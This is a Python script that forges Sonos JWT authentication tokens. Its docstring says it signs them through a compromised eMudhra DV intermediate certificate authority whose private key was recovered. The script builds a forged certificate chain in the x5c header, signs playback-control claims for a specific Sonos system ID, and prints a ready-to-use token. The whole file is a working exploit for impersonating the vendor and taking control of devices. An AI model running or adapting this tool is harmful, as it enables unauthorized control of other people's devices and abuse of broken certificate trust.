#!/usr/bin/env python3
"""Mint a Sonos assertion through the compromised eMudhra DV intermediate (Oct 2026).
Chain: forged leaf <- EM DV TLS CA - G3B (key recovered, key is all-zero-ish) <-
emSign Root TLS CA - G3 <- emSign ECC Root CA - G3 (present in the device bundle).
Usage: mint_jwt.py <claims-json-or-'{}'>  -> prints the JWT."""
import json, base64, subprocess, time, sys, os
D = os.path.dirname(os.path.abspath(__file__))
def der(p): return subprocess.run(["openssl", "x509", "-in", p, "-outform", "DER"], capture_output=True).stdout
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
ALG = os.environ.get("ALG", "RS256")
LEAF = "leaf.pem" if ALG == "ES256" else "rleaf.pem"
x5c = [base64.b64encode(der(os.path.join(D, p))).decode()
       for p in (LEAF, "EM-DV-TLS-CA-G3B.crt.pem", "chain2.pem", "emroot.pem")]
now = int(time.time())
claims = {"jti": "p1", "iss": "Sonos", "aud": "Sonos", "sub": "probe", "iat": now,
          "exp": now + 86400, "systemId": "5CAAFD21D470", "riat": now,
          "rexp": now + 86400, "scp": ["playback-control-all"]}
claims.update(json.loads(sys.argv[1]) if len(sys.argv) > 1 else {})
hdr = {"alg": ALG, "typ": "JWT", "x5c": x5c}
if os.environ.get("KID"):
    hdr["kid"] = os.environ["KID"]
si = (b64(json.dumps(hdr).encode()) + "." + b64(json.dumps(claims).encode())).encode()
der_sig = subprocess.run(["openssl", "dgst", "-sha256", "-sign", os.path.join(D, "leaf.key" if ALG == "ES256" else "rleaf.key")], input=si, capture_output=True).stdout
if ALG == "ES256":
    i = 2 if der_sig[1] < 0x80 else 2 + (der_sig[1] & 0x7f)
    assert der_sig[i] == 2
    rl = der_sig[i + 1]; r = der_sig[i + 2:i + 2 + rl]; i += 2 + rl
    assert der_sig[i] == 2
    sl = der_sig[i + 1]; s_ = der_sig[i + 2:i + 2 + sl]
    sig = r[-32:].rjust(32, b"\0") + s_[-32:].rjust(32, b"\0")
else:
    sig = der_sig
print(si.decode() + "." + b64(sig))
